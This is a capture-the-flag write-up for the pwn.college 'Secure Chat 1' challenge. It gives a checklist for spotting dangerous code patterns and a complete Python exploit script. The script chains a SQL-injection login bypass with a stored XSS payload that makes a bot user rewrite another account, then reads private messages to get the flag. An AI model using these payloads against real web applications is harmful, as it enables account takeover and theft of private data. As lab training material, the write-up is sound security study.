# Secure Chat 1

#### The source code is huge for both, so I asked Gemini ways to parse through it to look for key pieces of info. 
Read the Simulation Script First:

Does a bot browse the site? -> XSS/CSRF.

Is there a "flag" file or a "flag" user? -> Target.

Are there IP restrictions? -> Spoofing or Proxying.

Grep (Search) for Dangerous Patterns:

Python: os.system, subprocess.run, eval, exec, pickle.load.

SQL: f"SELECT, format(...), %s without tuple parameters.

Web: return f"..." (XSS), redirect(url) (Open Redirect).

C/Binary: strcpy, gets, sprintf (Buffer Overflows).

Focus on "State Changes":

Look at functions that write data (UPDATE, INSERT, fwrite).

Look at functions that change privileges (setuid, admin=True).

Ask: "Can I trigger this function with bad data?"

----------------------------------------------

#### After finding some of the key words I began to follow the logic flow of how the bots interacted. This led to finding out the proper chain to execute. I've begun to appreciate the status prints when not using pwntools as a way to see where things are breaking and makes it fun.
```python
import requests
import time
import urllib.parse

t_addr = "http://10.0.0.1"

def hack():
    s = requests.Session()
    
    print("Logging in as Mallory...")
    
    log_on = "' UNION SELECT 'mallory', 'x', 0 --"
    s.post(f"{t_addr}/login", data={
        "username": log_on,
        "password": "x"
    })
    
    r = s.get(f"{t_addr}/")
    if "Hello mallory!" not in r.text:
        print("Failed to login as Mallory.")
        return
    print("Logged in as Mallory.")

    path = "/user/' OR username LIKE 'sharon%' --/modify"
    
    js_data = f"""
    <script>
    fetch("{path}", {{
        method: "POST",
        headers: {{
            "Content-Type": "application/x-www-form-urlencoded"
        }},
        body: "username=hacker&password=password&admin=false"
    }});
    </script>
    """
    
    print("Sending XSS to Alice...")
    s.post(f"{t_addr}/chat/alice", data={"message": js_data})
    
    print("Sent. Waiting for Alice to view the message...")
    time.sleep(10)
    
    print("Logging in as hacker from Sharon...")
    s = requests.Session()
    s.post(f"{t_addr}/login", data={
        "username": "hacker",
        "password": "password"
    })
    
    r = s.get(f"{t_addr}/")
    if "Hello hacker!" not in r.text:
        print("Login failed")
        return
        
    print("Login successful, reading Bob's messages...")
    r = s.get(f"{t_addr}/chat/bob")
    
    if "pwn.college{" in r.text:
        flag = r.text.split("pwn.college{")[1].split("}")[0]
        print(f"\npwn.college{{{flag}}}")
    else:
        print("Flag not found, text recovered:")
        print(r.text)

if __name__ == "__main__":
    hack()
